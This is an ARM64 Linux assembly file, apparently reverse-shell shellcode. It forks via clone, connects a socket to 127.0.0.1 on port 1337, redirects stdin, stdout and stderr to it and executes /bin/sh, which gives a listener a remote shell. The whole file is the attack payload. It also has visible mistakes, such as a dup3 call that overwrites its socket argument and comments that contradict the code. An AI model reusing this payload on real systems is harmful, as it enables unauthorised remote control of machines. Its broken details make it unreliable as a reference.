.section .data

socketstruct:
        .ascii "\x02\x00"      // AF_INET 0xff will be NULLed 
        .ascii "\x05\x39"      // port number 1337 
        .byte 127,0,0,1      // IP Address
shell:
        .ascii "/bin/sh"

.section .text
.global _start
_start:

// clone() to mimic fork()
        mov     x8, #220        // x8 = 220 (clone)
        mov     x0, #0x100000   // flags: CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND
        mov     x1, #0          // new_stack (0 means use current stack)
        mov     x2, #0          // parent_tidptr
        mov     x3, #0          // child_tidptr
        mov     x4, #0          // tls
        svc     #0
        cbz     x0, child_process // if x0 == 0, jump to child_process
        b       parent_process    // if x0 > 0, jump to parent_process

parent_process:
        // parent process can exit or continue doing other things
        mov     x8, #93         // x8 = 93 (exit)
        mov     x0, #0          // exit status 0
        svc     #0

child_process:
        // socket(2, 1, 0) 
        mov   x0, #2
        mov   x1, #1
        mov   x2, #0
        mov   w8, #198
        svc   #1              // x0 = resultant sockfd 
        mov   x4, x0          // save sockfd in x4 

        // connect(r0, &sockaddr, 16) 
        mov   x0, x4            // write 0 for AF_INET 
        adr   x1, socketstruct        // pointer to address, port 
        mov   x2, #16
        mov   w8, #203         // x8 = 203 (connect)
        svc   #1

        // dup3(sockfd, 0, 0) 
                
        mov   x0, x4           // x4 is the saved sockfd 
        mov   x1, #0           // x1 = 0 (stdin)
        mov   x2, #0           // x2 = 0
        mov   w8, #24          
        svc   #1

        // dup3(sockfd, 1, 0) 
        mov   x0, x4          // x4 is the saved sockfd 
        mov   x1, #1          // x1 = 1 (stdout) 
        mov   x0, #0          // x2 = 0 
        svc   #1

        // dup3(sockfd, 2, 0) 
        mov   x0, x4         // x4 is the saved sockfd 
        mov   x1, #2         // x1 = 2 (stderr)
        mov   x2, #0         // x2 =
        svc   #1

        // execve("/bin/sh",0,0) 
        adr   x0, shell
        mov   x1, #0        
        mov   x2, #0
        mov   w8, #221       // x8 = 221 (execve) 
        svc   #1

